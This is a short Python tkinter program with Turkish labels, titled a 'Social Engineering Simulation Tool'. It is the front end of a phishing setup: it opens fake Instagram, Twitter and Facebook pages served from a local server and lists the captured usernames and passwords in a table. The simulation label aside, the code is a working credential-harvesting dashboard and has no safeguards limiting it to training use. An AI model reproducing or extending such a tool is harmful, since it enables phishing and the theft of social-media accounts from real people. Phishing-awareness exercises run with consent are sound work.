import tkinter as tk
import webbrowser
import requests
from tkinter import ttk, messagebox

BASE_URL = "http://localhost:5000"

def fetch_user_data():
    try:
        response = requests.get(f"{BASE_URL}/veriler")
        data = response.json()
        update_table(data)
    except Exception as e:
        messagebox.showerror("Hata", f"Veri alınamadı:\n{e}")

def update_table(data):
    for row in table.get_children():
        table.delete(row)
    for i, (username, password) in enumerate(data, 1):
        table.insert("", "end", values=(i, username, password))

def open_fake_page(platform):
    url_map = {
        "Instagram": f"{BASE_URL}/instagram",
        "Twitter": f"{BASE_URL}/twitter",
        "Facebook": f"{BASE_URL}/facebook"
    }
    webbrowser.open(url_map[platform])

window = tk.Tk()
window.title("Sosyal Mühendislik Simülasyon Aracı")
window.geometry("600x400")

tk.Label(window, text="Sahte Sayfa Aç", font=("Arial", 14, "bold")).pack(pady=10)

btn_frame = tk.Frame(window)
btn_frame.pack()

for name in ["Instagram", "Twitter", "Facebook"]:
    tk.Button(btn_frame, text=f"{name} Sahte Sayfa Aç", width=20,
              command=lambda n=name: open_fake_page(n)).pack(side=tk.LEFT, padx=10)

tk.Label(window, text="Alınan Kullanıcı Verileri", font=("Arial", 12)).pack(pady=15)

table = ttk.Treeview(window, columns=("Sıra", "Kullanıcı Adı", "Şifre"), show="headings", height=10)
for col in table["columns"]:
    table.heading(col, text=col)
table.pack(padx=20, fill="both", expand=True)

tk.Button(window, text="Verileri Güncelle", command=fetch_user_data).pack(pady=10)

window.mainloop()
